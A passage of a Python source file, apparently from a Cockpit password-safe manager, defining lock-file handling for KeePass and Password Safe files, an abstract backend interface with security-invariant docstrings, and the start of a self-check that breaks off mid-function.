    """Honour and create the lock file the desktop clients use (I13).

    Conventions, taken from the two clients rather than invented:

      - **KeePass / KeePassXC** append to the whole name:
        `mydb.kdbx` -> `mydb.kdbx.lock`. The content is a small INI with a
        `[Lock]` section naming the time, an id, the user and the machine.
      - **Password Safe** replaces the extension:
        `mydb.psafe3` -> `mydb.plk`. The content is a `user@host:pid` locker
        string.

    Ignoring these is bad practice #12: a save that ignores a lock silently
    discards whatever the desktop app wrote. Honouring them is not a mutual
    exclusion primitive — an advisory dot-file never is — it is interoperation
    with the clients that share this file.

    Three rules this class enforces:

      1. A foreign lock is a `Conflict` naming the holder, never a forced write.
         The holder string comes out of a file an attacker may control, so it is
         sanitised (control characters stripped, truncated) before it reaches an
         error detail.
      2. We remove ONLY a lock we created. Our content carries a random token;
         on release the file is re-read and the token compared with
         `constant_time_eq` before the unlink. If someone replaced our lock with
         theirs, we leave it alone.
      3. Stale-lock override is `override_stale=True`, supplied by the caller
         from an explicit operator action. There is no timeout, no heuristic and
         no automatic recovery: "the holder looks dead" is a guess, and guessing
         wrong costs someone their credentials.

    Usage:

        with LockFile(path, fmt="kdbx"):
            atomic_replace(path, data, expect_fingerprint=fp)
    """

    __slots__ = ("safe_path", "fmt", "lock_path", "override_stale",
                 "_token", "_created", "holder")

    def __init__(self, safe_path, *, fmt, override_stale=False):
        if not isinstance(safe_path, str) or not safe_path.startswith("/"):
            raise Invalid("safe path is not absolute")
        self.safe_path = safe_path
        self.fmt = fmt
        self.lock_path = self.lock_path_for(safe_path, fmt)
        self.override_stale = bool(override_stale)
        self._token = _sysrandom.token_hex(16)
        self._created = False
        self.holder = None

    # -- naming ------------------------------------------------------------

    @staticmethod
    def lock_path_for(safe_path, fmt):
        """`<name>.kdbx.lock` for kdbx, `<name>.plk` for psafe3."""
        if fmt == "kdbx":
            return safe_path + ".lock"
        if fmt == "psafe3":
            root, _ext = os.path.splitext(safe_path)
            return root + ".plk"
        raise Unsupported("no lock-file convention for format %r"
                          % _sanitize_detail(str(fmt), 24))

    # -- content -----------------------------------------------------------

    def _payload(self):
        """What we write. Shaped like the client's own so it reads sensibly if
        a human or the client itself looks at it."""
        user = _current_user_name()
        host = _hostname()
        if self.fmt == "kdbx":
            return (
                "[Lock]\n"
                "Time=%s\n"
                "ID=%s\n"
                "UserName=%s\n"
                "Domain=\n"
                "Machine=%s\n"
                % (time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
                   self._token, user, host)
            ).encode("utf-8")
        # Password Safe's locker string, with our token appended on its own line
        # so rule 2 above has something to compare and pwsafe still parses the
        # first line it cares about.
        return ("%s@%s:%d\ncockpit-secrets-id=%s\n"
                % (user, host, os.getpid(), self._token)).encode("utf-8")

    def _read_holder(self):
        """Best-effort description of whoever holds the lock, for the Conflict.

        Read O_NOFOLLOW: the lock file sits next to the safe, in a directory a
        user-class caller can write, so it is attacker-shaped input like any
        other file (adversary A1).
        """
        try:
            fd = os.open(self.lock_path,
                         os.O_RDONLY | os.O_NOFOLLOW | os.O_CLOEXEC)
        except OSError:
            return None
        # The read has to be guarded too, and separately. `os.open` on a
        # DIRECTORY succeeds — O_NOFOLLOW does not exclude one — and the
        # `os.read` that follows then raises IsADirectoryError. That exception
        # was raised INSIDE the `except FileExistsError` handler of acquire(),
        # where the sibling `except OSError` of the same try statement cannot
        # catch it, so it escaped as `internal / IsADirectoryError` BEFORE the
        # `override_stale` branch was ever consulted: the documented escape
        # hatch could not be used, and the safe stayed un-savable until someone
        # removed the directory by hand. Returning None here puts the caller
        # back on the ordinary "unnamed holder" path, and acquire() names the
        # real obstruction separately.
        try:
            raw = os.read(fd, 4096)
        except OSError:
            return None
        finally:
            os.close(fd)
        text = raw.decode("utf-8", "replace")
        for line in text.splitlines():
            if line.startswith("UserName="):
                return _sanitize_detail(line.split("=", 1)[1], 64)
            if "@" in line and ":" in line:
                return _sanitize_detail(line, 64)
        return _sanitize_detail(text, 64) or "an unnamed process"

    def _holds_our_token(self):
        try:
            fd = os.open(self.lock_path,
                         os.O_RDONLY | os.O_NOFOLLOW | os.O_CLOEXEC)
        except OSError:
            return False
        try:
            raw = os.read(fd, 4096)
        except OSError:
            # Same hazard as _read_holder: the path may not be a regular file.
            # "Not ours" is the safe answer — release() then leaves it alone.
            return False
        finally:
            os.close(fd)
        return self._token.encode("ascii") in raw

    # -- acquire / release -------------------------------------------------

    def acquire(self):
        """Take the lock, or raise `Conflict` naming the holder."""
        try:
            fd = os.open(self.lock_path,
                         os.O_WRONLY | os.O_CREAT | os.O_EXCL | os.O_CLOEXEC
                         | os.O_NOFOLLOW, 0o600)
        except FileExistsError:
            # What is actually in the way? A directory (or a fifo, or a device)
            # at the lock path is DEBRIS, not a holder, and answering "locked by
            # another client" for it sends the operator to close a client that
            # is not running. Named before the holder is read, so both the
            # plain and the override branch get the accurate message.
            try:
                mode = os.lstat(self.lock_path).st_mode
            except OSError:
                mode = stat.S_IFREG
            if not (stat.S_ISREG(mode) or stat.S_ISLNK(mode)):
                raise Conflict(
                    "the lock path exists but is not a lock file; remove it by "
                    "hand — this is not something an override can clear")
            self.holder = self._read_holder()
            if not self.override_stale:
                raise Conflict("the safe is locked by %s; close it there, or "
                               "override the stale lock explicitly"
                               % (self.holder or "another client"))
            # Explicit operator override only. Remove and retry exactly once —
            # a loop here would race two overriding callers against each other.
            try:
                os.unlink(self.lock_path)
            except IsADirectoryError:
                # Debris, not a lock. `os.unlink` cannot remove a directory and
                # `os.rmdir` would delete something we did not create and know
                # nothing about, so say exactly what is in the way and let a
                # human decide. Conflict, not Internal: the save did not fail
                # for an unknown reason, it failed because the lock path is
                # occupied — the same class of event as a real holder.
                raise Conflict(
                    "the lock path is a directory, not a lock file; remove it "
                    "by hand — this is not something an override can clear")
            except OSError:
                raise Conflict("the stale lock could not be removed")
            try:
                fd = os.open(self.lock_path,
                             os.O_WRONLY | os.O_CREAT | os.O_EXCL
                             | os.O_CLOEXEC | os.O_NOFOLLOW, 0o600)
            except OSError:
                raise Conflict("the safe was locked again while overriding")
        except OSError as exc:
            raise Internal("lock file could not be created: %s"
                           % errno.errorcode.get(exc.errno, "OSError"))
        # A LOCK FILE WE FAILED TO WRITE MUST NOT SURVIVE US.
        #
        # `os.open(O_CREAT|O_EXCL)` above has already created the file. If the
        # payload write then fails — a completely full filesystem is the case
        # that happens — the exception leaves `acquire()` from inside
        # `__enter__`, so Python never calls `__exit__` and `release()` never
        # runs. Nothing else in the program removes a lock file. Measured on a
        # 0-byte-free tmpfs: the save failed, a zero-length `.kdbx.lock` stayed
        # behind, and every later save answered `conflict / locked by an
        # unnamed process` — long after the disk was free — with `override_stale`
        # as the only way out, which is exactly the habit I13 needs operators
        # NOT to acquire. Unlinking what we just created is the whole fix.
        try:
            os.fchmod(fd, 0o600)
            write_all(fd, self._payload())
        except BaseException as exc:
            try:
                os.unlink(self.lock_path)
            except OSError:
                pass
            if isinstance(exc, OSError):
                raise Internal("the lock file could not be written: %s"
                               % errno.errorcode.get(exc.errno, "OSError"))
            raise
        finally:
            os.close(fd)
        self._created = True
        return self

    def release(self):
        """Remove the lock — but only if it is still OURS (rule 2)."""
        if not self._created:
            return
        self._created = False
        try:
            if self._holds_our_token():
                os.unlink(self.lock_path)
            else:
                # Someone replaced our lock. Unlinking it would silently unlock
                # a database another client believes it holds.
                _note("lock file %s was replaced by another holder; leaving it"
                      % self.lock_path)
        except OSError:
            pass

    def __enter__(self):
        return self.acquire()

    def __exit__(self, exc_type, exc, tb):
        self.release()
        return False

    def __repr__(self):
        return "<LockFile %s created=%s>" % (self.lock_path, self._created)


def _current_user_name():
    """Login name for a lock file. Never fails — a lock is not the place to."""
    try:
        import pwd
        return pwd.getpwuid(os.geteuid()).pw_name
    except Exception:                                   # noqa: BLE001
        return "uid%d" % os.geteuid()


def _hostname():
    try:
        return os.uname().nodename
    except Exception:                                   # noqa: BLE001
        return "localhost"


# ===========================================================================
# Backend — the adapter interface kdbx.py and psafe3.py implement
# ===========================================================================

_BACKENDS = {}


def register_backend(fmt):
    """Class decorator: `@register_backend("kdbx")` above the adapter.

    Lets `secrets-admin` resolve a registry `format` to a class without
    importing both backends eagerly — a psafe3 unlock should not need the KDBX
    XML stack and a kdbx unlock should not need Botan.
    """
    def deco(cls):
        cls.format = fmt
        _BACKENDS[fmt] = cls
        return cls
    return deco


def backend_for(fmt):
    """The registered class for a format, or `Unsupported`.

    The caller is expected to have imported the module that registers it; a
    format with no backend installed is `unsupported`, never a traceback.
    """
    try:
        return _BACKENDS[fmt]
    except KeyError:
        raise Unsupported("no backend is available for format %r"
                          % _sanitize_detail(str(fmt), 24))


def known_formats():
    """Formats that currently have a registered backend."""
    return sorted(_BACKENDS)


class Backend(abc.ABC):
    """One safe file, one format, one short-lived process.

    Concrete adapters: `backends/kdbx.py` (pykeepass) and `backends/psafe3.py`
    (implemented from formatV3.txt). Both are constructed from a **validated
    registry entry**, never from a request body: the entry is what supplies the
    path, and a caller-supplied path is I4.

    TWO INVARIANTS EVERY IMPLEMENTATION MUST HOLD. They are the reason this
    class exists rather than the backends just being two modules:

    1. **`entries()` MUST NOT return a password or any protected value.**
       Not the password field, not a protected custom string, not a TOTP seed,
       not a TOTP code, not attachment content. `reveal()` is the only door, and
       it opens one named field of one named entry, once, and is audited. A list
       view that carries passwords means every browse ships the whole database
       to the browser, where I11 says it must never be. `has_totp` and
       `attachments` are counts and booleans for exactly this reason.

    2. **No method may return a decrypted value before its MAC has verified.**
       Both formats force decrypt-then-authenticate — PWS3 puts its HMAC at the
       end of the file, and KDBX4's inner XML is attacker-shaped until the block
       HMACs check out. Parse into memory, verify, and only then let anything
       out. Returning early turns a parser bug into a decryption oracle (I6).
       A failed MAC and a wrong passphrase both raise `BadCredential` with the
       SAME detail.

    Supporting rules:

      - Mutating methods (`add`, `edit`, `move`, `rm`, `group_*`) change the
        IN-MEMORY database only. Nothing reaches disk until `save()`.
      - `save()` goes through `atomic_replace` under a `LockFile`, with the
        `Fingerprint` captured at `unlock()` as `expect_fingerprint` (I12, I13).
      - A safe whose parse->serialize->parse round trip is not lossless must
        refuse writes and name the field that would be lost (I22). Refusing to
        save beats amputating a database.
      - `warnings` is a list of operator-facing strings the UI shows as
        persistent banners — the KDBX3 "not authenticated" banner (I20) lives
        there. Warnings never contain a value.
      - Passphrases arrive as `Secret` and are zeroed by the CALLER in a
        `finally`. A backend must not keep a reference to one past `unlock()`.

    State an implementation is expected to maintain:

        self.entry        the validated registry entry dict
        self.path         entry["path"]; convenience only
        self.unlocked     bool
        self.readonly     bool — registry mode "ro", or KDBX3 (I20), or a
                          failed losslessness guard (I22)
        self.warnings     list[str]
        self.fingerprint  Fingerprint captured at unlock, for the save re-check
        self.handle       opaque 128-bit token, bound to (uid, safe id, pid)
    """

    #: "kdbx" | "psafe3" — set by @register_backend.
    format = ""

    def __init__(self, entry):
        """`entry` is a registry entry that ALREADY passed schema validation.

        A backend does not validate the registry — `secrets-admin` does, and it
        drops a failing entry rather than defaulting it to a permissive class
        (I1). What a backend may assume: `id`, `label`, `format` and an absolute
        `path` are present, and `access` has been resolved (missing => admin).
        """
        self.entry = dict(entry)
        self.path = self.entry.get("path", "")
        self.unlocked = False
        self.readonly = (self.entry.get("mode", "rw") == "ro")
        self.warnings = []
        self.fingerprint = None
        self.handle = None

    # -- guards concrete backends call, so the rule is written once ---------

    def require_unlocked(self):
        """`AccessDenied` unless `unlock()` has succeeded on this instance.

        AccessDenied and not NotFound: "that handle is not open" and "that
        handle belongs to someone else" must be indistinguishable, or handle
        enumeration becomes possible (docs/CONTRACT.md, handle semantics).
        """
        if not self.unlocked:
            raise AccessDenied("this safe is not unlocked")

    @staticmethod
    def verify_structure(data):
        """Prove bytes are a COMPLETE file of this format. NO CREDENTIAL.

        Deliberately not abstract and deliberately not a stub that returns
        True: the default refuses, so a format that has not implemented this
        cannot be silently treated as verified.

        WHY IT EXISTS. `restore-backup` takes no passphrase — by design, since
        the usual reason to restore is that the live file no longer opens — so
        it cannot decrypt a generation to check it. What it CAN do is ask the
        format whether these bytes are structurally whole, and until this
        existed it did not: `_read_backup` bounded a generation only from below
        by "not empty" and then checked four bytes of magic. A file truncated
        at 4096 bytes of 4661 keeps its magic, so it passed, and
        `restore-backup` wrote it over the live safe, which then did not open.
        The comment above `_SAFE_MAGIC` claimed the magic check "does prove it
        is not a truncated file". This is the function that makes that sentence
        true.

        Raises `Invalid` with an operator-safe reason; returns None on success.
        Must never need a key, must never decrypt, and must be O(file).
        """
        raise Unsupported("this format cannot check a file for completeness "
                          "without opening it")

    def require_writable(self):
        """`AccessDenied` when the REGISTRY forbids writes (`mode: "ro"`).

        A backend raises `Unsupported` instead when the FORMAT forbids them —
        KDBX3 has no authenticated encryption so we never write it (I20) — and
        `Conflict` when the losslessness guard failed (I22). Three different
        causes, three different codes, because an operator can act on each
        differently.
        """
        self.require_unlocked()
        if self.readonly:
            raise AccessDenied("this safe is open read-only")

    # -- read side ---------------------------------------------------------

    @abc.abstractmethod
    def probe(self):
        """Inspect the file WITHOUT any credential. No secret is involved.

        Returns docs/CONTRACT.md's probe object::

            {"format": "kdbx"|"psafe3", "version": "4.1",
             "kdf": "argon2id"|"aes-kdf"|"pws3-sha256",
             "iterations": int, "needs_password": bool, "needs_keyfile": bool,
             "writable": bool, "warnings": [str]}

        Everything here is header metadata that anyone holding the file already
        has. Nothing derived from a key, nothing that distinguishes "this file
        would open with passphrase X" — a probe that says too much is one of the
        oracles Task 9 goes looking for.

        Raises `Invalid` for a malformed or truncated file, `NotFound` when it
        is gone, `AccessDenied` for the I5 refusals.
        """

    @abc.abstractmethod
    def unlock(self, password, keyfile=None, session=None, *,
               yubikey_response=None):
        """Derive the key, verify the MAC, and open the database in memory.

        Args:
            password: `Secret` or None. None is legal ONLY when the registry
                      entry sets `password_required: false`, which the schema
                      permits only alongside a `keyfile` or `yubikey_slot` —
                      and which the helper re-checks, because a schema is not an
                      enforcement point.
            keyfile:  `Secret` holding key-file BYTES (from `keyfile_b64` in the
                      request, or read helper-side from the registry `keyfile`
                      path). Never a caller-supplied path (I4).
            session:  opaque session id for the multi-verb `open` flow, or None
                      for the default one-process-one-operation shape.
            yubikey_response:
                      RAW BYTES of a hardware token's challenge-response answer
                      — the 20-byte HMAC-SHA1 a YubiKey returns for the
                      challenge `challenge_for()` published — or None. It is a
                      key component, not a passphrase: the helper obtains it
                      from the token and hands it over on stdin like everything
                      else (I10), and a backend whose FORMAT has no
                      challenge-response concept raises `Unsupported` rather
                      than ignoring it. Ignoring it would let an operator
                      believe a second factor was in play when it was not.

        Returns docs/CONTRACT.md's unlock object::

            {"handle": "<128-bit hex>", "expires_in": int,
             "entries_total": int, "groups_total": int, "warnings": [str]}

        Must, in this order: clamp the KDF parameters (`Limits.check_*`) BEFORE
        deriving anything (I7); derive; verify the MAC with `hmac.compare_digest`
        (I6); capture `self.fingerprint` from the same fd it read (I13); only
        then set `self.unlocked`.

        Raises `BadCredential` for a wrong passphrase AND for a failed MAC, with
        the same detail for both. Raises `Invalid` for out-of-range KDF
        parameters and structurally broken files — refusing those leaks nothing
        about the passphrase, which is why they get a different code.

        Does NOT zero `password`; the caller owns that in a `finally`.
        """

    @abc.abstractmethod
    def tree(self):
        """The group hierarchy. `{"groups": [{"uuid","name","parent","count"}]}`

        `parent` is None for the root. Depth is capped at
        `Limits.MAX_GROUP_DEPTH` and the count of groups at
        `Limits.MAX_GROUPS` — a 10 000-deep nesting is in the malformed corpus
        because it blows a recursive walker's stack.
        """

    @abc.abstractmethod
    def entries(self, group=None, query=None, offset=0, limit=100):
        """A page of entry METADATA. **Never a password.** See invariant 1.

        Returns::

            {"total": int,
             "entries": [{"uuid","title","username","url","tags",
                          "has_totp": bool, "attachments": int,
                          "modified": "<ISO-8601 UTC>"}]}

        `has_totp` is a boolean and `attachments` is a count precisely so that
        the presence of a secret can be shown without the secret. A protected
        custom field is not listed here with its value; it is listed by name
        only, and `reveal` fetches it.

        `query` is a plain substring match applied helper-side across title,
        username, url and tags. `offset`/`limit` are clamped by the
        implementation; an unbounded limit would ship the whole database.
        """

    @abc.abstractmethod
    def reveal(self, uuid, field):
        """**The only door a secret leaves through.** One field, once, audited.

        Args:
            uuid:  entry uuid from `entries()`
            field: "password" | "username" | "url" | "notes" | "totp-seed" |
                   a custom string field name

        Returns `{"field": str, "value": str, "expires_in": int}` where
        `expires_in` is `Limits.REVEAL_SECONDS` — the countdown the UI runs
        before it re-masks and drops the value (I17).

        The caller (`secrets-admin`) writes ONE audit line naming the verb, the
        safe, the uid and the outcome — never the field's value, and never the
        entry's title (I15).

        Raises `NotFound` for an unknown uuid or field, `AccessDenied` when the
        safe is not unlocked by this caller.
        """

    @abc.abstractmethod
    def totp(self, uuid):
        """A current TOTP code. As sensitive as a password; same treatment.

        Returns `{"code": str, "seconds_remaining": int}`. Never appears in
        `entries()` output — that is what `has_totp` is for. Raises
        `Unsupported` when the entry has no OTP configuration, `NotFound` when
        the uuid is unknown.
        """

    @abc.abstractmethod
    def attach_list(self, uuid):
        """The NAMES of one entry's attachments, and their sizes. **No bytes.**

        Returns a list, in the order the file stores them::

            [{"name": str, "size": int}, ...]

        It exists because `entries()` reports `attachments` as a COUNT, on
        purpose — a listing must show that an entry HAS attachments without
        shipping them. A count is not addressable, though, and `attach_get`
        takes a NAME, so with only those two methods an attachment can be
        uploaded and never fetched again from a page that never learned what it
        is called. This is the missing half: names in, bytes out through
        `attach_get`, one audited call each.

        It is deliberately the same shape as `history()` — presence and size,
        never content. `size` is the DECLARED length of the stored bytes and is
        reported even when it exceeds `Limits.MAX_ATTACHMENT_BYTES`, because
        "there is a 40 MiB file here that this transport will not carry" is a
        more useful answer than hiding the row; `attach_get` is where that cap
        refuses.

        An entry with no attachments returns `[]`. `NotFound` is for an unknown
        uuid, never for an empty list. A format with no attachment concept at
        all raises `Unsupported` naming that limit — it does not return `[]`,
        because an empty list says "this entry has none" and that is a
        different and untrue statement about a format that cannot have any.
        """

    @abc.abstractmethod
    def attach_get(self, uuid, name):
        """One attachment's content, base64, streamed to the browser.

        Returns `{"name": str, "size": int, "b64": str}`. Size is checked
        against `Limits.MAX_ATTACHMENT_BYTES` from the DECLARED length before
        anything is allocated (I7).

        The name comes from `attach_list()`, which is the only thing that
        publishes one; `entries()` publishes a count and nothing addressable.

        The content goes through the Cockpit channel to the browser and never
        lands on this host's disk — an attachment written to a server-side path
        is the exfiltration channel I21 is about.
        """

    @abc.abstractmethod
    def history(self, uuid):
        """Previous versions of one entry, METADATA ONLY. **Never a password.**

        Returns a list, oldest first::

            [{"index": int, "when": "<ISO-8601 UTC>", "title": str,
              "username": str, "url": str, "has_password": bool,
              "notes_len": int}, ...]

        `index` is the position in that list and is what `history_restore`
        takes. It is positional and therefore only valid until the next
        mutation of this entry — a stable id would have to be invented, and
        inventing one means writing a field the file never had (I22).

        `has_password` is a boolean for the same reason `entries()` reports
        `has_totp` as one: a history view has to show that a version HAD a
        password without shipping it. `reveal()` is still the only door, and it
        opens the CURRENT version — reading an archived password means
        restoring the version first, which is a mutation and therefore audited.

        `notes_len` is a length and not the notes. Note the difference from
        `fields()`, which deliberately reports neither: this list exists so an
        operator can tell two versions apart before restoring one, and the
        caller already holds the safe unlocked. A length is the least that
        answers "did the notes change here"; anything less makes the view
        useless and anything more is the value.

        A format with no per-entry history models whatever it does have (PWS3's
        password-history field) rather than returning an empty list, and says so
        in its docstring. `Unsupported` only where there is genuinely nothing.
        """

    @abc.abstractmethod
    def export_plain(self, *, fmt):
        """**The single most dangerous method in this codebase.** Read this.

        It returns EVERY secret in the safe, decrypted, in the clear, in one
        object: every password, every note, every TOTP seed, every protected
        custom field, every archived password in every history version. There
        is no other method here that does that. `reveal()` — the door this
        project spent its whole design budget narrowing to one field of one
        entry, once, audited — is bypassed entirely. One call is the whole
        database.

        That is why:

          * it is an `admin`-only verb, off unless the registry entry sets
            `export_allowed: true`, and preceded by an explicit confirmation
            naming what is about to be written in the clear (I21);
          * it returns BYTES and never writes a file. The helper owns the
            destination, writes `0600` into an operator-configured directory,
            and audits it by name. A backend that took a path would be taking a
            client-supplied path (I4) into the one operation that empties the
            safe;
          * the bytes must not be logged, echoed into an error `detail`, or
            kept anywhere after the helper has handed them over (I15).

        Args:
            fmt: "csv" | "xml" | "json". Keyword-only so no caller can pass it
                 positionally and get a format it did not mean.

        Returns:
            bytes — the complete export, UTF-8 where the format is textual.

        **`bytes` is immutable, so the return value cannot be zeroed** (I14,
        bad practice #13). That is not an oversight and there is no version of
        this method that avoids it: building a plaintext export means every
        password in the safe exists as an unwipeable object on the GC heap, and
        every intermediate `str` the formatter made is another copy. The
        mitigation is the one the whole program rests on — the helper lives for
        one operation and its address space returns to the kernel in
        milliseconds — plus `harden_process()` having already turned off core
        dumps and `ptrace`. A caller must hand these bytes on and drop them; it
        must not stash them, and it must never let them reach a log line.

        Attachment CONTENT is excluded and attachment NAMES are listed: an
        export is for migrating credentials, and inlining megabytes of base64
        turns one dangerous file into an unwieldy dangerous file. `attach_get`
        remains the way to move an attachment, one at a time, audited.

        Raises `Unsupported`, with a detail naming the reason, for a `fmt` the
        FORMAT cannot honestly express — never a silent approximation. A file
        that claims to be another project's export format and is not is the
        I19 mistake wearing a different hat.
        """

    # -- mutation: in memory only, nothing reaches disk until save() -------

    @abc.abstractmethod
    def add(self, group, entry):
        """Create an entry in `group`. Returns `{"uuid": str}`.

        `entry` is a dict of field name -> value, validated against the field
        descriptors the `schema` verb publishes. In memory only.
        """

    @abc.abstractmethod
    def edit(self, uuid, changes):
        """Apply `changes` (field -> new value) to one entry.

        Returns `{"uuid": str, "changed": [field, ...]}` — the NAMES of the
        fields that changed, never their values (I15). In memory only.
        """

    @abc.abstractmethod
    def move(self, uuid, group):
        """Move an entry to another group. Returns `{"ok": True}`."""

    @abc.abstractmethod
    def rm(self, uuid, permanent=False):
        """Delete an entry. Returns `{"ok": True, "recycled": bool}`.

        Default is recycle-bin-aware where the format has one (KDBX);
        `permanent=True` bypasses it and is unrecoverable except from the backup
        ring, so the UI must confirm it explicitly.
        """

    @abc.abstractmethod
    def group_add(self, parent, name):
        """Create a group under `parent` (None = root). `{"ok": True}`."""

    @abc.abstractmethod
    def group_rm(self, uuid, permanent=False):
        """Delete a group and its contents. `{"ok": True}`.

        Depth and entry counts still obey `Limits`; deleting a group that
        contains entries must be confirmed by the caller, not assumed.
        """

    @abc.abstractmethod
    def group_mv(self, uuid, parent):
        """Re-parent a group. `{"ok": True}`.

        Must refuse to move a group into its own descendant — that produces a
        cycle the tree walker will not survive.
        """

    @abc.abstractmethod
    def history_restore(self, uuid, index):
        """Roll one entry back to the version `history()` listed at `index`.

        Returns `{"uuid": str, "restored_from": int}`. In memory only — like
        every other mutation, nothing reaches disk until `save()`.

        **The current version must be archived first**, so that a restore is
        itself undoable. A restore that discards what you had is a data-loss
        bug wearing a feature's clothes, and the operator who reached for it
        was already unsure which version they wanted.

        Archiving obeys the format's own history policy where it has one (PWS3
        records carry an on/off flag and a maximum size; KDBX keeps the limits
        in `Meta`). Overriding that policy would write a database describing a
        state the file's own settings say is impossible.

        Raises `NotFound` for an index that is not in `history()`.
        """

    @abc.abstractmethod
    def attach_add(self, uuid, name, data, *, replace=False):
        """Attach `data` (BYTES) to an entry under `name`. In memory only.

        Bytes, not base64 and not a path: base64 is the request encoding and
        belongs to the helper, and a path would be I4 pointed at a file the
        browser named. `Limits.MAX_ATTACHMENT_BYTES` is checked before anything
        is stored.

        `replace=False` makes an existing `name` a `Conflict` rather than a
        silent overwrite — losing an attachment to a name collision is the same
        class of harm as I22.

        Returns `{"ok": True, "name": str, "size": int}`. Raises `Unsupported`
        where the FORMAT has no attachment concept, naming that as the reason.
        """

    @abc.abstractmethod
    def attach_rm(self, uuid, name):
        """Detach `name` from one entry. In memory only. `{"ok": True}`.

        Detaching is not the same act as deleting the bytes where the format
        shares an attachment pool across entries and history versions (KDBX4).
        An implementation must free pool storage only when NOTHING still
        references it, and must never leave a dangling reference behind — both
        directions of that mistake corrupt a database that other readers then
        refuse.

        Raises `NotFound` when the entry has no such attachment.
        """

    # -- persistence -------------------------------------------------------

    @abc.abstractmethod
    def save(self, *, override_stale=False):
        """Serialize and write the safe durably. The only method that writes.

        `override_stale` is passed straight to `LockFile`. It exists because
        `LockFile`'s own Conflict tells the operator to "override the stale
        lock explicitly" — and until this parameter existed there was no way to
        do that through a verb, so a helper killed mid-save left a `.lock` /
        `.plk` that made the safe permanently un-savable until someone deleted
        the file by hand. It is still never automatic and there is still no
        timeout heuristic (I13): the caller has to ask for it, once, per save.

        Required sequence, and there are no shortcuts (I12, I13):

          1. `require_writable()` — and the caller re-verifies the access class
             first, because the class is checked on EVERY verb (I3).
          2. Take the `LockFile` for the format; a foreign lock is a `Conflict`
             naming the holder, unless `override_stale` was asked for.
          3. Serialize to bytes in memory.
          4. `atomic_replace(self.path, data, expect_fingerprint=self.fingerprint,
             backup_dir=..., keep=...)` — which re-checks the fingerprint,
             backs up, writes the temp file, fsyncs, replaces, fsyncs the dir.
          5. Update `self.fingerprint` from the result.

        Returns `{"ok": True, "backup": str|None, "bytes": int,
        "conflict": False}` — docs/CONTRACT.md's save object. A conflict is
        raised, not returned as `conflict: true`; the field exists so the UI has
        a stable shape.
        """

    @abc.abstractmethod
    def save_as(self, target_path, *, override_stale=False):
        """Write the in-memory database to a NEW path. Returns
        `{"path": str, "bytes": int}`.

        **The original is not touched, and that is the whole contract.** Not
        its bytes, not its `Fingerprint` (which still describes the original, so
        a later `save()` still re-checks against what it read at unlock), not
        its `.lock`/`.plk`, and not its backup ring — `target_path` does not
        exist yet, so `atomic_replace` has nothing to back up and never opens
        the original at all. A test asserts the original's sha256 is unchanged
        across this call, because "I didn't mean to touch it" is not a property.

        `target_path` is absolute and **already validated by the helper**, which
        is where I4 is enforced: the registry names the safes, and this is the
        one operation that legitimately writes somewhere the registry does not
        list. A backend still refuses a path that is not in normal form and one
        that already exists (`Conflict`) — never overwrite, because for the
        instant before `os.replace` the operator's only copy would be the one we
        are half-way through re-encrypting.

        `override_stale` applies to the TARGET's lock file, not the original's:
        two concurrent copies to the same destination are the race this closes.

        The same refusals as `save()` apply for the same reasons: a format we do
        not write (KDBX3, I20) is not made writable by pointing it at a new
        name, and a database that would lose a field on serialisation loses it
        just as thoroughly into a copy (I22).
        """

    @abc.abstractmethod
    def lock(self):
        """Drop the decrypted database and every key derived from it.

        Zero every `Secret` still held, clear the in-memory database, close the
        `SafeFile`, invalidate `self.handle`, set `self.unlocked = False`.
        Returns `{"ok": True}`. Idempotent: locking a locked safe succeeds.

        In the default configuration this is nearly ceremonial — the helper exits
        after one operation and the whole address space goes with it — but the
        multi-verb `open` session and the optional agent (I18) both keep a
        process alive, and for those this is the thing that ends the unlock.
        """


# ===========================================================================
# self-check — runnable proof, not an assertion
# ===========================================================================

def _selfcheck():                                       # noqa: C901
    """Exercise the load-bearing paths. `python3 backends/base.py` runs this.

    Deliberately runs the REFUSALS, not just the happy paths: a guard that has
    never been observed refusing is a guard nobody has tested.

    Writes only into a throwaway directory, and writes no secret material into
    it — the "never /tmp" rule is about safes and their backups, not about a
    self-check's scratch space.
    """
    import shutil
    import tempfile

    failures = []
    checks = [0]

    def ok(label, cond):
        checks[0] += 1
        if cond:
            print("  ok    %s" % label)
        else:
            print("  FAIL  %s" % label)
            failures.append(label)

    def raises(label, exc_type, fn):
        checks[0] += 1
        try:
            fn()
        except exc_type as exc:
            print("  ok    %-52s -> %s(%r)"
                  % (label, type(exc).__name__, exc.detail))
            return
        except BaseException as exc:                    # noqa: BLE001
            print("  FAIL  %s -> wrong exception %s: %s"
                  % (label, type(exc).__name__, exc))
            failures.append(label)
            return
        print("  FAIL  %s -> no exception" % label)
        failures.append(label)

    print("cockpit-secrets backends/base.py self-check (v%s)" % VERSION)

    # ---------------------------------------------------------- hardening --
    print("\n== harden_process (I14) ==")
    # close_fds=False: the self-check holds its own descriptors open and this is
    # not a real helper start-up.
    r1 = harden_process(close_fds=False, quiet=False)
    r2 = harden_process(close_fds=False, quiet=True)
    ok("RLIMIT_CORE is 0", resource.getrlimit(resource.RLIMIT_CORE)[0] == 0)
    ok("harden_process reports core_disabled", r1["core_disabled"] is True)
    ok("harden_process is idempotent", r2["already"] is True)
    ok("umask is 0o077", (lambda m: (os.umask(m), m == 0o077)[1])(os.umask(0)))
    print("       mlockall=%s (%s), dumpable_off=%s"
          % (r1["mlockall"], r1["mlockall_error"], r1["dumpable_off"]))

    # ------------------------------------------------------------- Secret --
    print("\n== Secret zeroing (I14) ==")
    sentinel = "correct-horse-battery-staple-9f3a"
    s = Secret(sentinel)
    buf = s.bytes                       # the LIVE buffer, deliberately aliased
    ok("Secret holds its bytes", bytes(buf) == sentinel.encode())
    ok("len() reports the length", len(s) == len(sentinel))
    ok("truthy while live", bool(s) is True)
    ok("repr() never shows the value", sentinel not in repr(s))
    ok("str() never shows the value", sentinel not in str(s))
    ok("str_view() round-trips", s.str_view() == sentinel)
    s.zero()
    ok("zero() emptied the live buffer in place", len(buf) == 0)
    ok("zeroed Secret is falsy", bool(s) is False)
    ok("zeroed Secret reports zeroed", s.zeroed is True)
    raises("bytes on a zeroed Secret", Invalid, lambda: s.bytes)
    raises("str_view on a zeroed Secret", Invalid, lambda: s.str_view())
    ok("zero() is idempotent", (s.zero(), True)[1])

    with Secret(sentinel) as ctx:
        inner = ctx.bytes
        ok("context manager yields a live Secret", len(inner) > 0)
    ok("__exit__ zeroed the buffer", len(inner) == 0)

    # zeroing must happen even when the body raises
    esc = Secret(sentinel)
    escbuf = esc.bytes
    try:
        with esc:
            raise RuntimeError("boom")
    except RuntimeError:
